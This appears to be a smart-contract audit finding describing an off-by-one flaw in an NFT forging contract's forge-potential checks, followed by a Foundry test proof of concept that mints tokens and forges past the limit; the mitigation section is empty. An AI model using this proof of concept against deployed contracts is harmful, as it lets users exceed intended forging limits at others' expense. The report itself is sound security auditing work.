# Vulnerability details

## Impact
The `listForForging` and `forgeWithListed` functions are part of the forging process, and the forge potential (FP) checks work differently for the forger and the merger:
- For the forger, the FP check is done before `forgingCounts` (FC) is incremented
- For the merger, the FP check is done after the FC is incremented.

This discrepancy allows the forger to make 1 more forge above its FP.

## Proof of Concept

- `testMedium_underForge` is PoC, the rest is setup

        nft.setEntropyGenerator(address(entropyGenerator));
        nft.setAirdropContract(address(airdrop));

        _initVars();
        _noWhitelist();

        uint256 _mergerId = _mintMerger(USER2);
        uint256 _mergerFP = uint8((nft.getTokenEntropy(_mergerId) / 10) % 10);
        assert(_mergerFP > 0);

        uint256 _forgerId;
        uint256 _forgerFP;
        do {
            _forgerId = _mintForger(USER1);
            _forgerFP = uint8((nft.getTokenEntropy(_forgerId) / 10) % 10);
        } while (_forgerFP != _mergerFP);

        console2.log("FFP: ", _forgerFP, ", MFP: ", _mergerFP); // @note We initialize 2 tokens with the same potential to show different in checks

        while (_mergerFP > 0) {
            vm.startPrank(USER1);
            entityForging.listForForging(_forgerId, 1 ether);
            vm.startPrank(USER2);
            deal(USER2, 1 ether);
            entityForging.forgeWithListed{value: 1 ether}(_forgerId, _mergerId);

            trackId++; // @note internal tracking for Test, because `_tokenIds` is private
            console2.log(
                "FFC: ", entityForging.forgingCounts(_forgerId), ", MFc: ", entityForging.forgingCounts(_mergerId)
            );

            _mergerFP--;
        }

        vm.startPrank(USER1);
        entityForging.listForForging(_forgerId, 1 ether);
        vm.startPrank(USER2);
        deal(USER2, 1 ether);
        vm.expectRevert("forgePotential insufficient"); // @audit-medium merger with the same merge potential can't merge
        entityForging.forgeWithListed{value: 1 ether}(_forgerId, _mergerId);

        _mergerId = _mintMerger(USER3);
        _mergerFP = uint8((nft.getTokenEntropy(_mergerId) / 10) % 10);
        assert(_mergerFP > 0);
        vm.startPrank(USER3);
        deal(USER3, 1 ether);
        vm.expectRevert("forgePotential insufficient");
        entityForging.forgeWithListed{value: 1 ether}(_forgerId, _mergerId); // @audit-medium any other merger token can complite the merge

    function _mintForger(address _user) internal returns (uint256) {
        uint256 _forgerId;
        do {
            _forgerId = _mintToken(_user);
        } while (!nft.isForger(_forgerId));
        return _forgerId;
    }

    function _mintMerger(address _user) internal returns (uint256) {
        uint256 _mergerId;
        do {
            _mergerId = _mintToken(_user);
        } while (nft.isForger(_mergerId));
        return _mergerId;
    }

    function _mintToken(address _user) internal returns (uint256) {
        trackId++;

        uint256 _mintPrice = nft.calculateMintPrice();
        deal(_user, _mintPrice);
        vm.startPrank(_user);
        nft.mintToken{value: _mintPrice}(new bytes32[](0));
        vm.stopPrank();

        return trackId;
    }

    function _noWhitelist() internal {
        vm.warp(nft.whitelistEndTime() + 1);
    }
}

## Recommended Mitigation Steps
